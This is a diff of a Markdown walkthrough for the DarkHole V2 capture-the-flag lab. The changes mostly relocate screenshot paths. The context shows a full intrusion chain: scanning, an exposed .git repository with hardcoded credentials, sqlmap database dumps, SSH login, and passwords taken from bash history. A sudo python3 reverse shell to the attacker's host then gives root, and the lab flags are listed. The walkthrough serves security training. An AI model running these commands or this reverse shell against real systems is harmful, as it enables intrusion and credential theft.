@@ -29,7 +29,7 @@ netdiscover -r 192.168.77.0/16
 
 **Result:** Target identified at `192.168.77.131`
 
-![Network Discovery](netdiscover.png)
+![Network Discovery](assets/screenshots/netdiscover.png)
 
 ---
 
@@ -48,23 +48,23 @@ nmap -sV -A -p- -T4 192.168.77.131
 
 **Key Finding:** Git repository discovered at `http://192.168.77.131/.git/`
 
-![Nmap Scan](nmap.png)
+![Nmap Scan](assets/screenshots/nmap.png)
 
 ### Web Application Analysis
 
 The application "DarkHole V2" features a landing page with "The Spark Diamond" theme.
 
-![Front Page](front_page.png)
+![Front Page](assets/screenshots/front_page.png)
 
 Login page discovered at `/login.php`:
 
-![Login Page](login_page.png)
+![Login Page](assets/screenshots/login_page.png)
 
 ### Git Repository Exposure
 
 Exposed `.git` directory listing found:
 
-![Git Exposure](git_exposure.png)
+![Git Exposure](assets/screenshots/git_exposure.png)
 
 Downloaded the git repository using `wget`:
 
@@ -72,7 +72,7 @@ Downloaded the git repository using `wget`:
 wget -r http://192.168.77.131/.git/
 ```
 
-![Wget Download](wget.png)
+![Wget Download](assets/screenshots/wget.png)
 
 ### Analyzing Git History
 
@@ -82,7 +82,7 @@ Examined git commit history:
 git log
 ```
 
-![Git Log](login-php.png)
+![Git Log](assets/screenshots/login-php.png)
 
 Inspecting a specific commit revealed **hardcoded credentials**:
 
@@ -94,7 +94,7 @@ git show a4d900a8d85e8938d3601f3cef113ee293028e10
 - Email: `lush@admin.com`
 - Password: `321`
 
-![Git Show](git-show.png)
+![Git Show](assets/screenshots/git-show.png)
 
 ---
 
@@ -104,15 +104,15 @@ git show a4d900a8d85e8938d3601f3cef113ee293028e10
 
 Successfully logged in using the discovered credentials:
 
-![Login Success](login-success.png)
+![Login Success](assets/screenshots/login-success.png)
 
 The dashboard reveals user information for "Jehad Alqurashi" (Web Designer & Developer).
 
-![Login Attempt](login_attempt.png)
+![Login Attempt](assets/screenshots/login_attempt.png)
 
 Session cookie captured:
 
-![Cookie Session](cookie-session.png)
+![Cookie Session](assets/screenshots/cookie-session.png)
 
 ### SQL Injection
 
@@ -124,7 +124,7 @@ sqlmap -r sql --dbs --batch
 
 **Database Identified:** MySQL 5.0.12
 
-![SQL DBMS](sql-dbms.png)
+![SQL DBMS](assets/screenshots/sql-dbms.png)
 
 Dumping database tables:
 
@@ -136,7 +136,7 @@ sqlmap -r sql -D darkhole_2 --tables --dump
 - User: `jehad`
 - Password: `fool`
 
-![SQL Injection](sql_injection.png)
+![SQL Injection](assets/screenshots/sql_injection.png)
 
 ### SSH Access
 
@@ -146,7 +146,7 @@ Connected via SSH:
 ssh jehad@192.168.77.131
 ```
 
-![SSH Access](exploit-done.png)
+![SSH Access](assets/screenshots/exploit-done.png)
 
 ---
 
@@ -162,7 +162,7 @@ cat .bash_history
 
 **Found Password:** `gang` for user `losy`
 
-![Bash History](bash_history.png)
+![Bash History](assets/screenshots/bash_history.png)
 
 Switched to user `losy`:
 
@@ -178,7 +178,7 @@ cat ~/user.txt
 
 **User Flag:** `DarkHole{'This_is_the_life_man_better_than_a_cruise'}`
 
-![User CTF](user_ctf.png)
+![User CTF](assets/screenshots/user_ctf.png)
 
 ### Privilege Escalation (losy → root)
 
@@ -190,7 +190,7 @@ sudo -l
 
 **Finding:** User `losy` can run `/usr/bin/python3` as root without password.
 
-![Losy Password](losy-passwd.png)
+![Losy Password](assets/screenshots/losy-passwd.png)
 
 #### Exploitation Method 1: Direct Shell
 
@@ -212,13 +212,13 @@ Execute reverse shell:
 sudo python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.77.130",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
 ```
 
-![NC Reverse Shell](nc-reverse-shell.png)
+![NC Reverse Shell](assets/screenshots/nc-reverse-shell.png)
 
 ### Root Access
 
 Obtained root shell:
 
-![Escalated](escalated.png)
+![Escalated](assets/screenshots/escalated.png)
 
 Retrieved **root flag**:
 
@@ -228,7 +228,7 @@ cat /root/root.txt
 
 **Root Flag:** `DarkHole Legend`
 
-![CTF Captured](ctf_captured.png)
+![CTF Captured](assets/screenshots/ctf_captured.png)
 
 ---
 
@@ -303,7 +303,7 @@ cat /root/root.txt
 ---
 
 ## Author
-**HEKKO**  
+**Your Name**  
 Date: February 10, 2026
 
 ## Disclaimer
@@ -316,4 +316,3 @@ This walkthrough is for educational purposes only. Only perform penetration test
 - The cybersecurity community
 
 **Happy Hacking! 🚀**
-
